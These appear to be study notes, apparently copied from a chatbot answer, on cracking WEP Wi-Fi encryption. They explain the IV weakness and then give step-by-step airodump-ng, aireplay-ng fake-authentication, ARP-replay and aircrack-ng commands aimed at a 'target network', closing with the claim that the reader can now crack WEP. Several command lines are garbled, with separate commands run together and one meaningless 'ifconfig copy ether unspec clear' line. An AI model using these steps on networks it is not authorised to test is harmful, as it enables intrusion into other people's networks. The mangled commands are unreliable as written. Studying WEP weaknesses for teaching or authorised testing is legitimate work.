### Network Hacking and Gaining Access

#### Wired Equivalent Privacy (WEP)

**Overview:**

- **Old encryption method** using the RC4 algorithm.
- Encrypts data using a key.
- Encrypted packet sent over the air; the router decrypts it using the same key.

**Problems with WEP:**

- Issues with implementation.
- WEP cracking is possible due to vulnerabilities in how keys are generated and used.

**Key Generation in WEP:**

- WEP generates a unique key for each packet using a random Initialization Vector (IV).
- IV is 24-bit only, leading to repeated IVs on busy networks.
- IV is sent in plaintext, making it vulnerable to attacks.
- Repeated IVs can be analyzed to determine the keystream and break encryption.

**Tools:**

- **Aircrack-ng**: Tool used for cracking WEP.

---

### WEP Cracking Process

1. **Capture Packets:**
    
    - Use **airodump-ng** to capture packets from the target network.
    - Analyze the capture for IVs and crack the key using **aircrack-ng**.
2. **Busy Network Process:**
    
    - Put the adapter in monitor mode.
    - Run:
        
        sh
        
        Copy code
        
        `airodump-ng --bssid [target_network_bssid] --channel 1 --write basic-wep wlan0`
        
    - Monitor the data column for the number of useful packets with different IVs.
    - Use:
        
        sh
        
        Copy code
        
        `aircrack-ng basic-wep01.cap`
        
    - If the key is found, it allows connection to the network.
3. **Idle Network Complications:**
    
    - Capturing different IVs takes longer.
    - Force the Access Point (AP) to generate IVs by associating with it before the attack.

---

### Detailed Steps for WEP Cracking on an Idle Network

1. **Monitor Mode Setup:**
    
    - Put adapter in monitor mode:
        
        sh
        
        Copy code
        
        `ifconfig wlan0 down iwconfig wlan0 mode monitor ifconfig wlan0 up`
        
2. **Capture Packets:**
    
    - Open two terminals.
    - First terminal:
        
        sh
        
        Copy code
        
        `airodump-ng --band a wlan0 airodump-ng --bssid [target_network_bssid] --channel 1 --write basic-wep wlan0`
        
    - Second terminal:
        
        sh
        
        Copy code
        
        `ls aircrack-ng basic-wep01.cap`
        
    
    **Note:** Restart Kali and check for best network connection if necessary.
    
3. **Forced IV Generation:**
    
    - Use three terminals.
        
    - First terminal:
        
        sh
        
        Copy code
        
        `airodump-ng --band a wlan0 airodump-ng --bssid [target_network_bssid] --channel 1 --write arprelay wlan0`
        
    - Second terminal:
        
        sh
        
        Copy code
        
        `aireplay-ng --fakeauth 0 -a [bssid] -h [unspec] wlan0`
        
    - Third terminal:
        
        sh
        
        Copy code
        
        `ifconfig copy ether unspec clear aireplay-ng --arpreplay -b [bssid] -h [unspec] wlan0`
        

**ARP Request Replay Attack:**

- Wait for an ARP packet, capture and replay it to cause the AP to produce packets with new IVs until enough IVs are collected.

---

### Steps Summary for ARP Request Replay Attack

1. **First Terminal:**
    
    sh
    
    Copy code
    
    `airodump-ng --band a wlan0 airodump-ng --bssid [target_network_bssid] --channel 1 --write arprelay wlan0`
    
2. **Second Terminal:**
    
    sh
    
    Copy code
    
    `aireplay-ng --fakeauth 0 -a [bssid] -h [unspec] wlan0`
    
3. **Third Terminal:**
    
    sh
    
    Copy code
    
    `ifconfig copy ether unspec clear aireplay-ng --arpreplay -b [bssid] -h [unspec] wlan0`
    
4. **Cracking the Key:**
    
    sh
    
    Copy code
    
    `aircrack-ng arprelay01.cap`
    

By following these steps, you can crack WEP encryption even on idle networks by generating necessary IVs using ARP request replay attacks.